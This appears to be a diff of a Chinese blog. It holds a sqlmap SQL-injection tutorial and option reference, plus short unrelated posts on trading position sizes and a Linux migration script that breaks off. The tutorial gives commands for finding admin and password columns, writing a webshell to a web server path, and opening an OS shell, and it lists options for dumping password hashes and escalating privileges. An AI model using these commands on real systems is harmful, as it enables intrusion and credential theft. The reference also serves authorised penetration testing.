+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -r "c:\tools\request.txt" --dbms mysql -D dedecms --search -C admin,password<br />
+在dedecms数据库中搜索字段admin或者password。
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	读取与写入文件
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	首先找需要网站的物理路径，其次需要有可写或可读权限。
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	--file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）<br />
+--file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）<br />
+--file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径<br />
+#示例：<br />
+sqlmap -r "c:\request.txt" -p id --dbms mysql --file-dest "e:\php\htdocs\dvwa\inc\include\1.php" --file-write "f:\webshell\1112.php"
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	使用shell命令：
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -r "c:\tools\request.txt" -p id --dms mysql --os-shell<br />
+接下来指定网站可写目录：<br />
+“E:\php\htdocs\dvwa”
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）
+</p>
+<h2 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	sqlmap详细命令：
+</h2>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--is-dba 当前用户权限（是否为root权限）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--dbs 所有数据库
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--current-db 网站当前数据库
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--users 所有数据库用户
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--current-user 当前数据库用户
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--random-agent 构造随机user-agent
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--passwords 数据库密码
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--proxy http://local:8080 --threads 10 (可以自定义线程加速) 代理
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）
+	</li>
+</ul>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	——————————————————————————————————
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Options（选项）：
+</h3>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--version 显示程序的版本号并退出
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-h, --help 显示此帮助消息并退出
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-v VERBOSE 详细级别：0-6（默认为1）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		保存进度继续跑：
+	</li>
+</ul>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<span style="color:#444444;">sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” 保存进度</span><br style="color:#444444;" />
+<span style="color:#444444;">sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” –resume 恢复已保存进度</span>
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Target（目标）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	以下至少需要设置其中一个选项，设置目标URL。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-d DIRECT 直接连接到数据库。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-u URL, --url=URL 目标URL。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-l LIST 从Burp或WebScarab代理的日志中解析目标。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-r REQUESTFILE 从一个文件中载入HTTP请求。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-g GOOGLEDORK 处理Google dork的结果作为目标URL。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-c CONFIGFILE 从INI配置文件中加载选项。
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Request（请求）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以用来指定如何连接到目标URL。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--data=DATA 通过POST发送的数据字符串
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--cookie=COOKIE HTTP Cookie头
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--cookie-urlencode URL 编码生成的cookie注入
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--drop-set-cookie 忽略响应的Set - Cookie头信息
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--user-agent=AGENT 指定 HTTP User - Agent头
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--random-agent 使用随机选定的HTTP User - Agent头
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--referer=REFERER 指定 HTTP Referer头
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--headers=HEADERS 换行分开，加入其他的HTTP头
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--auth-cred=ACRED HTTP身份验证凭据（用户名:密码）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--auth-cert=ACERT HTTP认证证书（key_file，cert_file）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--proxy=PROXY 使用HTTP代理连接到目标URL
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--ignore-proxy 忽略系统默认的HTTP代理
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--timeout=TIMEOUT 等待连接超时的时间（默认为30秒）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--retries=RETRIES 连接超时后重新连接的时间（默认3）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--safe-url=SAFURL 在测试过程中经常访问的url地址
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Enumeration（枚举）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行<br />
+您自己的SQL语句。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-b, --banner 检索数据库管理系统的标识
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--current-user 检索数据库管理系统当前用户
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--current-db 检索数据库管理系统当前数据库
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--is-dba 检测DBMS当前用户是否DBA
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--users 枚举数据库管理系统用户
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--passwords 枚举数据库管理系统用户密码哈希
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--privileges 枚举数据库管理系统用户的权限
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--roles 枚举数据库管理系统用户的角色
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--dbs 枚举数据库管理系统数据库
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-D DBname 要进行枚举的指定数据库名
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-T TBLname 要进行枚举的指定数据库表（如：-T tablename --columns）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--tables 枚举的DBMS数据库中的表
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--columns 枚举DBMS数据库表列
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--dump 转储数据库管理系统的数据库中的表项
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--dump-all 转储所有的DBMS数据库表中的条目
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--search 搜索列（S），表（S）和/或数据库名称（S）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-C COL 要进行枚举的数据库列
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-U USER 用来进行枚举的数据库用户
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--exclude-sysdbs 枚举表时排除系统数据库
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--start=LIMITSTART 第一个查询输出进入检索
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--stop=LIMITSTOP 最后查询的输出进入检索
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--first=FIRSTCHAR 第一个查询输出字的字符检索
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--last=LASTCHAR 最后查询的输出字字符检索
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--sql-query=QUERY 要执行的SQL语句
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--sql-shell 提示交互式SQL的shell
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Optimization（优化）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可用于优化SqlMap的性能。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-o 开启所有优化开关
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--predict-output 预测常见的查询输出
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--keep-alive 使用持久的HTTP（S）连接
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--null-connection 从没有实际的HTTP响应体中检索页面长度
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--threads=THREADS 最大的HTTP（S）请求并发量（默认为1）
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Injection（注入）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-p TESTPARAMETER 可测试的参数（S）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--dbms=DBMS 强制后端的DBMS为此值
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--os=OS 强制后端的DBMS操作系统为这个值
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--prefix=PREFIX 注入payload字符串前缀
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--suffix=SUFFIX 注入payload字符串后缀
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--tamper=TAMPER 使用给定的脚本（S）篡改注入数据
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Detection（检测）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--level=LEVEL 执行测试的等级（1-5，默认为1）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--risk=RISK 执行测试的风险（0-3，默认为1）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--string=STRING 查询时有效时在页面匹配字符串
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--regexp=REGEXP 查询时有效时在页面匹配正则表达式
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--text-only 仅基于在文本内容比较网页
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Techniques（技巧）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可用于调整具体的SQL注入测试。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--technique=TECH SQL注入技术测试（默认BEUST）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--union-cols=UCOLS 定列范围用于测试UNION查询注入
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--union-char=UCHAR 用于暴力猜解列数的字符
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Fingerprint（指纹）：
+</h3>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-f, --fingerprint 执行检查广泛的DBMS版本指纹
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Brute force（蛮力）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以被用来运行蛮力检查。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--common-tables 检查存在共同表
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--common-columns 检查存在共同列
+	</li>
+</ul>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	User-defined function injection（用户自定义函数注入）：<br />
+这些选项可以用来创建用户自定义函数。
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	--udf-inject 注入用户自定义函数<br />
+--shared-lib=SHLIB 共享库的本地路径
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	File system access（访问文件系统）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以被用来访问后端数据库管理系统的底层文件系统。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--file-read=RFILE 从后端的数据库管理系统文件系统读取文件
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Operating system access（操作系统访问）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以用于访问后端数据库管理系统的底层操作系统。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--os-cmd=OSCMD 执行操作系统命令
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--os-shell 交互式的操作系统的shell
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--os-pwn 获取一个OOB shell，meterpreter或VNC
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--os-smbrelay 一键获取一个OOB shell，meterpreter或VNC
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--os-bof 存储过程缓冲区溢出利用
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--priv-esc 数据库进程用户权限提升
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--msf-path=MSFPATH Metasploit Framework本地的安装路径
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--tmp-path=TMPPATH 远程临时文件目录的绝对路径
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Windows注册表访问：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以被用来访问后端数据库管理系统Windows注册表。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-read 读一个Windows注册表项值
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-add 写一个Windows注册表项值数据
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-del 删除Windows注册表键值
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-key=REGKEY Windows注册表键
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-value=REGVAL Windows注册表项值
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-data=REGDATA Windows注册表键值数据
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-type=REGTYPE Windows注册表项值类型
+	</li>
+</ul>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以用来设置一些一般的工作参数。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-s SESSIONFILE 保存和恢复检索会话文件的所有数据
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--flush-session 刷新当前目标的会话文件
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--fresh-queries 忽略在会话文件中存储的查询结果
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--eta 显示每个输出的预计到达时间
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--update 更新SqlMap
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--save file保存选项到INI配置文件
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--batch 从不询问用户输入，使用所有默认配置。
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Miscellaneous（杂项）：
+</h3>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--beep 发现SQL注入时提醒
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--check-payload IDS对注入payloads的检测测试
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--cleanup SqlMap具体的UDF和表清理DBMS
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--forms 对目标URL的解析和测试形式
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--page-rank Google dork结果显示网页排名（PR）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--parse-errors 从响应页面解析数据库管理系统的错误消息
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--replicate 复制转储的数据到一个sqlite3数据库
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--wizard 给初级用户的简单向导界面
+	</li>
+</ul>
+
+<p>
+	sqlmap-u http://testphp.vulnweb.com/listproducts.php?cat=1
+</p>
+<p>
+	sqlmap-master\sqlmap.py -u &nbsp;"http://www.ddd.com/index?d=55" --batch --banner
+</p>
+
+
+
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/164608.html">https://www.freebuf.com/sectool/164608.html</a></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2026/09/19/stock/">
+                股市币市
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2026-09-19</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/新/">新</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>本金 </p>
+<p>三折最多</p>
+<p>三折以上就是突发状况</p>
+<p>有信心可以all in 30%</p>
+<pre><code>信心一般可以先 20%
+</code></pre>
+<p>小试牛刀 10% </p>
+<pre><code>补刀 10%
+
+    收回本金 cl 1
+    或者收回补刀的钱 cl 2
+
+开始做空
+</code></pre>
+<p>一定要留补仓 40%</p>
+<p>本金越大 补仓率就要增高</p>
+<p>2&#x2F;24</p>
+<p>2684 200</p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2026/09/19/system-migration/">
+                系统迁移
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2026-09-19</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/Linux/">Linux</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h2 id="系统文件迁移"><a href="#系统文件迁移" class="headerlink" title="系统文件迁移"></a>系统文件迁移</h2><p>安装必需工具</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install rsync mailutils  <span class="comment"># 对于 Debian/Ubuntu</span></span><br><span class="line"><span class="built_in">sudo</span> yum install rsync mailx          <span class="comment"># 对于 CentOS</span></span><br></pre></td></tr></table></figure>
+
+<p>backup_and_migrate.sh</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主要变量</span></span><br><span class="line">SOURCE_USER=<span class="string">&quot;source_user&quot;</span></span><br><span class="line">SOURCE_HOST=<span class="string">&quot;source_host&quot;</span></span><br><span class="line">SOURCE_DIR=<span class="string">&quot;/path/to/source/directory/&quot;</span></span><br><span class="line">TARGET_USER=<span class="string">&quot;target_user&quot;</span></span><br><span class="line">TARGET_HOST=<span class="string">&quot;target_host&quot;</span></span><br><span class="line">TARGET_DIR=<span class="string">&quot;/path/to/target/directory/&quot;</span></span><br><span class="line">BACKUP_DIR=<span class="string">&quot;/path/to/backup/directory/&quot;</span></span><br><span class="line">LOG_FILE=<span class="string">&quot;migration.log&quot;</span></span><br><span class="line">EMAIL_RECIPIENT=<span class="string">&quot;admin@example.com&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建备份</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;创建备份...&quot;</span> &gt;&gt; <span class="variable">$LOG_FILE</span></span><br><span 